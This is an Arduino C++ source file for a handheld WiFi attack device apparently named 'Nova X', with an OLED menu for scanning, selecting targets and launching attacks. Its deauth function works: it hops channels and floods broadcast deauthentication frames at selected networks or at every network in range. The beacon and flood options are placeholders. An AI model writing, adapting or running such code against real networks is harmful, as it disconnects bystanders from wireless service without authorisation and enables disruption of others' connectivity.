//---------Name(Change!)
#define NAME "warwick320"
//-------------
// Terminal Editon
#undef max
#undef min
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <cmath>
#include "LOGO.h"
#include "WebUI.h"
//-------------- For Testing
// #include "vector"
// #include "Button.h"
//--------------------------

//-------------- Display
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define WHITE SSD1306_WHITE
//----------------------

//-------------- Mode Default
#define Attack 1
#define Scan 2
#define Select 3
#define Settings 4
#define Info 5
//-------------------

//-------------- Mode In Attack Menu
#define DEAuth 1
#define AllDEAuth 2
#define Beacon 3
#define ASSoc 4
#define AUThen 5
//---------------------------------
Adafruit_SSD1306 display(SCREEN_WIDTH,SCREEN_HEIGHT,&Wire,OLED_RESET);

void draw_outline(){
  display.drawLine(0,0,0,63,WHITE);
  display.drawLine(0,63,127,63,WHITE);
  display.drawLine(127,0,127,63,WHITE);
  //display.display();
}
void Render_text_typing(String text,int delayt = 20){
  for (int i = 0; i < text.length(); i++){
    display.print(text[i]);
    display.display();
    delay(delayt);
  }
}
void top_bar(String Text,String State){
  display.fillRect(0, 0, SCREEN_WIDTH, 9, WHITE); // 16 = 두깨
  display.setTextColor(SSD1306_BLACK);
  display.setCursor(1,1);
  display.print(Text);
  if (State.length() > 6) display.setCursor(55, 1);
  else display.setCursor(80, 1);
  display.print(State);
  display.setTextColor(WHITE);
  //display.display();
}
void Main_title(String Text,bool Typing_flag) {
  display.setCursor(2, 11);
  if(Typing_flag) Render_text_typing(Text);
  else display.print(Text);
}

void render_cursor(int y){
  display.setCursor(3,y);
  display.print(">");
  //display.display();
}

const int max_text_height = 7;
const int draw_defualt_com_y = 20;
const int draw_defualt_com_x = 15;
std::vector<int> selected_ssid;
std::vector<String> Main = {"Attack","Scan","Select","Settings","Info"};
std::vector<String> Pre_menu;
void draw_menu_com(std::vector<String>& menu,int selected_item){
  selected_item -= 1;
  const int maxVisibleItems = 4;
  int start_index = 0;
  bool menu_changed = (menu != Pre_menu);
  int draw_increase_com_y = draw_defualt_com_y;
  if (selected_item >= maxVisibleItems) start_index = selected_item - maxVisibleItems + 1;

  if (menu_changed) if(menu[0] == "Deauth") {Main_title("root: --attack-list",menu_changed);} else Main_title("root: ~#",menu_changed);
  else if(menu[0] == "Deauth"){Main_title("root: --attack-list",menu_changed);} else Main_title("root: ~#",menu_changed);
  for(int i=start_index; i < menu.size() && i < start_index + maxVisibleItems; i++){
    if(i == selected_item) render_cursor(draw_increase_com_y);
    display.setCursor(draw_defualt_com_x,draw_increase_com_y);
    draw_increase_com_y += 11;
    Serial.println(draw_increase_com_y);
    if (menu_changed) Render_text_typing(menu[i]);    
    else display.print(menu[i]);
  }
  display.display();
  Pre_menu = menu;
}
void draw_menu(std::vector<String>& menu,int scrollindex,String state_text){
  display.clearDisplay();
  draw_outline();
  top_bar("Nova X",state_text);
  draw_menu_com(menu,scrollindex);
}
void display_setup(){
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 F"));
    while (true)
      ;
  }

  display.clearDisplay();
  display.setTextSize(1);
}
int scrollindex = 1;
void draw_web(){
  display.clearDisplay();
  draw_outline();
  top_bar("Nova X","root:Web-UI");
  Main_title("root@Web-UI: --serve",true);
  display.setCursor(2,draw_defualt_com_y);
  Render_text_typing("State:  Running...");
  display.setCursor(2,draw_defualt_com_y+11);
  Render_text_typing("IP: 192.168.4.1");
  display.display();
  while(true){
    //web ui logic here
    if(ButtonPress(btnBack)){
      break;
    }
  }
}
void Beacon_fl(int mode){
  if(mode == 0) Serial.println("Spam");
  else Serial.println("Clone");
}
bool contains(std::vector<int>& vec, int value) {
  for (int v : vec) {
    if (v == value) {
      return true;
    }
  }
  return false;
}
void addValue(std::vector<int>& vec, int value) {
  if (!contains(vec, value)) {
    vec.push_back(value);
  } else {
    Serial.print(value);
    Serial.println("Exits");
    for (auto IT = vec.begin(); IT != vec.end();) {
      if (*IT == value) {
        IT = vec.erase(IT);
      } else {
        ++IT;
      }
    }
    Serial.println("De-selected");
  }
}

void drawCharProgressBar(int x, int y, int totalBlocks, int progress) {
  display.fillRect(x, y, totalBlocks * 6, 8, BLACK);
  int filled = (progress * totalBlocks) / 100;
  display.setTextColor(WHITE);
  display.setCursor(x, y);
  for (int i = 0; i < filled; i++) {
    display.print('#');
  }
  display.display();
}

void RunningCharProgressBar(){
  static unsigned long lastUpdate = 0;
  static int progress = 0;

  if (millis() - lastUpdate > 200) {
    progress += 5;
    if (progress > 100) progress = 0;
    lastUpdate = millis();
    drawCharProgressBar(15, 31, 15, progress);
  }
}

bool deauth_break_flag = false;
void deauth(int SetMode) {
  deauth_channels.clear();
  chs_idx.clear();
  current_ch_idx = 0;
  
  switch (SetMode) {
    case 0: {
      Serial.println("Single");
      for (int i = 0; i < selected_ssid.size(); i++) {
        int idx = selected_ssid[i];
        Serial.println(scan_results[idx].ssid);
        int ch = scan_results[idx].channel;
        deauth_channels[ch].push_back(idx);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
    case 1: { 
      Serial.println("AL");
      for (int i = 0; i < scan_results.size(); i++) {
        int ch = scan_results[i].channel;
        deauth_channels[ch].push_back(i);
        if (!contains(chs_idx, ch)) {
          chs_idx.push_back(ch);
        }
      }
      break;
    }
  }
  
  isDeauthing = true;
  deauth_break_flag = false;
  while (isDeauthing && !deauth_channels.empty() && !deauth_break_flag) {
    pollRotary();
    RunningCharProgressBar();
    display.display();
    if (current_ch_idx < chs_idx.size()) {
      pollRotary();
      int ch = chs_idx[current_ch_idx];
      wext_set_channel(WLAN0_NAME, ch);
      if (ButtonPress(btnBack)) {
        deauth_break_flag = true;
        break;
      }
      if (deauth_channels.find(ch) != deauth_channels.end()) {
        std::vector<int>& networks = deauth_channels[ch];
        pollRotary();
        if (ButtonPress(btnBack)) {
          deauth_break_flag = true;
          break;
        }
        for (int i = 0; i < 20; i++) {
          pollRotary();
          if (ButtonPress(btnBack)) {
            deauth_break_flag = true;
            break;
          }
          
          for (int j = 0; j < networks.size(); j++) {
            int idx = networks[j];
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", 2);
            sent_frames++;
          }
          
          delay(send_delay);
        }
      }
      current_ch_idx++;
      if (current_ch_idx >= chs_idx.size()) {
        current_ch_idx = 0;
      }
    }
  }
  
  isDeauthing = false;
  wext_set_channel(WLAN0_NAME, current_channel);
}
std::vector<String> Attack_menu = {"Deauth","All Deauth","Beacon","Authen Flood","Assoc Flood"};
std::vector<String> Beacon_menu = {"Spam","Clone"};
void draw_attack_menn(int state){
  display.clearDisplay();
  draw_outline();
  deauth_break_flag = false;
  top_bar("Nova X","root:Attack");
  Main_title("root@Attack: --attack",true);
  display.setCursor(2,20);
  Render_text_typing("root@State: /");

  state -= 1;
  while(true){
    pollRotary();
    if (ButtonPress(btnBack)) break;
    if (Attack_menu[state] == "Deauth"){deauth(0); break;}
    if (Attack_menu[state] == "All Deauth"){deauth(1); break;}

  }
}
int scanNetworks(String text) {

  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");

  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    unsigned long start = millis();
    const unsigned long scanTime = 10000;
    int lastDots = -1;
    if(text == "Scanning"){
      while (millis() - start < scanTime) {
        int dotCount = ((millis() - start) / 500) % 4;
        display.clearDisplay();
        draw_outline();
        top_bar("Nova X","root:Scan");
        Main_title("root@Scan: --scan",false);
        display.setCursor(draw_defualt_com_x,draw_defualt_com_y);
        display.print(text);
        for (int i = 0; i < 4; i++) {
          display.print(i <= dotCount ? '.' : ' ');
        }
        display.display();
        delay(50);
      }
    }
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    display.setCursor(0, 32);
    display.println("Scan failed!");
    display.display();
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}


void draw_ssid_list(int selected_item){
  display.clearDisplay();
  draw_outline();
  top_bar("Nova X","root:Scan");
  Main_title("root@Select: --list",false);
  const int maxVisibleItems = 4;
  int start_index = 0;
  int draw_increase_com_y = draw_defualt_com_y;
  if (selected_item >= maxVisibleItems) start_index = selected_item - maxVisibleItems + 1;
  for (int i = start_index; i < scan_results.size() && i < start_index + maxVisibleItems; i++){
    if(i == selected_item) render_cursor(draw_increase_com_y);
    String ssid = scan_results[i].ssid;
    if (ssid.length() == 0) ssid = "#hidden#";
    else if (ssid.length() > 11) ssid = ssid.substring(0,11) + "..";
    display.setCursor(draw_defualt_com_x+90,draw_increase_com_y);
    bool checked = contains(selected_ssid,i);
    String mark = checked ? "[*]":"[ ]";
    display.println(mark);
    display.setCursor(draw_defualt_com_x,draw_increase_com_y);
    draw_increase_com_y += 11;
    display.println(ssid);
  }
  display.display();
}
void draw_select_menu(){
  // display.clearDisplay();
  // draw_outline();
  // top_bar();
  // Main_title("Root@Select: --list",true);
  scrollindex = 0;
  //int maxVis = 4;
  while(true){
    pollRotary();
    display.clearDisplay();
    if(ButtonPress(btnBack)){
      scrollindex = 1;
      break;
    }
    if(ButtonPress(btnUp)){
      if(scrollindex > 0){
        scrollindex -= 1;
      }
    }
    if(ButtonPress(btnDown)){
      if(scrollindex < scan_results.size() - 1){
        scrollindex +=1;
      }
    }
    if (ButtonPress(btnOk)) { 
      addValue(selected_ssid, scrollindex);
    }
    draw_ssid_list(scrollindex);
  }
}
void draw_info(String name){
  display.clearDisplay();
  draw_outline();
  top_bar("Nova X","root:Info");
  Main_title("root@n0vax:~$ whoami",true);
  display.setCursor(draw_defualt_com_x,draw_defualt_com_y);
  Render_text_typing(name);
  display.setCursor(2,draw_defualt_com_y+11);
  Render_text_typing("root@n0vax:~$ -v");
  display.setCursor(draw_defualt_com_x,draw_defualt_com_y+22);
  Render_text_typing("V-0.7_BETA");
  while(true){if(ButtonPress(btnBack)) break;}
}
void cursor_handler(std::vector<String>& menu,int mode){
  while(true){
    pollRotary();
    if (ButtonPress(btnBack)){
      if(mode == 0){
        draw_web();
        draw_menu(menu,scrollindex,"root");
      } else {
        scrollindex = 1; 
        break;
      }
    }
    if(ButtonPress(btnOk)){
      switch(mode){
        case 0:{
          switch(scrollindex){
            case Attack: draw_menu(Attack_menu,scrollindex,"root:Attack"); cursor_handler(Attack_menu,Attack); draw_menu(menu,scrollindex,"root"); break;
            case Scan: if(scanNetworks("Scanning")!=0){while(true) delay(1000);} draw_menu(menu,scrollindex,"root");break;
            case Select: draw_select_menu(); draw_menu(menu,scrollindex,"root"); break;
            case Settings: break;
            case Info: draw_info(NAME); draw_menu(menu,scrollindex,"root"); break;
          }
          break;
        }
        case Attack :{
          Serial.println("In Attack");
          switch(scrollindex){
            case DEAuth:
              draw_attack_menn(DEAuth);
              draw_menu(Attack_menu,scrollindex,"root:Attack");
              break;
            case AllDEAuth:
              draw_attack_menn(AllDEAuth);
              draw_menu(Attack_menu,scrollindex,"root:Attack");
              break;
            case Beacon:
              //draw_attack_menn(Beacon);
              scrollindex = 1;
              draw_menu(Beacon_menu,scrollindex,"root:Attack");
              cursor_handler(Beacon_menu,Beacon);
              draw_menu(Attack_menu,scrollindex,"root:Attack");
              break;
            case AUThen:
              Serial.println("Authen");
              break;
            case ASSoc:
              Serial.println("Assoc");
              break;
          }
          break;
        }
        case Beacon:{
          switch(scrollindex){
            case 1: Beacon_fl(0); break;
            case 2: Beacon_fl(1); break;
          }
          break;
        }
      }
    }
    if(ButtonPress(btnDown)){
      if(scrollindex < menu.size()){
        scrollindex += 1;
        switch(mode){
          case Attack: draw_menu(menu,scrollindex,"root:Attack"); break;
          case Scan: draw_menu(menu,scrollindex,"root:Scan"); break;
          case Select: draw_menu(menu,scrollindex,"root:Select"); break;
          case Settings: draw_menu(menu,scrollindex,"root:Settings"); break;
          case Info: draw_menu(menu,scrollindex,"root:Info"); break;
          default: draw_menu(menu,scrollindex,"root"); break;
        }
        //draw_menu(menu,scrollindex,"Root");
      }
    }
    if(ButtonPress(btnUp)){
      if(scrollindex > 1){
        scrollindex -= 1;
        switch(mode){
          case Attack: draw_menu(menu,scrollindex,"root:Attack"); break;
          case Scan: draw_menu(menu,scrollindex,"root:Scan"); break;
          case Select: draw_menu(menu,scrollindex,"root:Select"); break;
          case Settings: draw_menu(menu,scrollindex,"root:Settings"); break;
          case Info: draw_menu(menu,scrollindex,"root:Info"); break;
          default: draw_menu(menu,scrollindex,"root"); break;
        }
      }
    }
  }
}
void display_update(){
  cursor_handler(Main,0);
}